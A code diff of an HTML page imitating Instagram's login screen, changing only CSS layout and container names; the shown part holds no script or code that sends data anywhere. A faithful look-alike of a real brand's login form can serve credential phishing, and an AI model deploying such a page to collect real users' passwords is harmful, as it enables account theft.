@@ -5,29 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
   <style>
-    /* Basic inline CSS for layout demo; move these to style.css as needed */
     body {
       background-color: #fafafa;
       font-family: Arial, sans-serif;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
+      min-height: 100vh;
       margin: 0;
       padding: 20px;
     }
-    #wrapper {
+    #container {
       width: 350px;
     }
     .login-container, .signup-container {
       background: #fff;
       border: 1px solid #dbdbdb;
-      padding: 20px;
       text-align: center;
       margin-bottom: 10px;
+      padding: 20px;
     }
-    .header h1 {
+    .login-container .header h1 {
       font-family: 'Billabong', cursive;
       font-size: 3rem;
       margin: 20px 0;
@@ -81,11 +80,9 @@
       font-size: 0.9rem;
       text-decoration: none;
     }
-    .signup-container {
-      border: 1px solid #dbdbdb;
-      padding: 15px;
-      background: #fff;
+    .signup-container p {
       font-size: 0.9rem;
+      margin: 0;
     }
     .signup-container a {
       color: #3897f0;
@@ -95,14 +92,14 @@
   </style>
 </head>
 <body>
-  <div id="wrapper">
+  <div id="container">
     <div class="login-container">
       <div class="header">
         <h1>Instagram</h1>
       </div>
       <form id="loginForm" class="input-fields">
-        <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required />
-        <input type="password" name="password" placeholder="Password" class="input" required />
+        <input type="text" name="username" placeholder="Phone number, username, or email" required />
+        <input type="password" name="password" placeholder="Password" required />
         <button type="submit" class="btn">Log In</button>
       </form>
       <div class="separator">
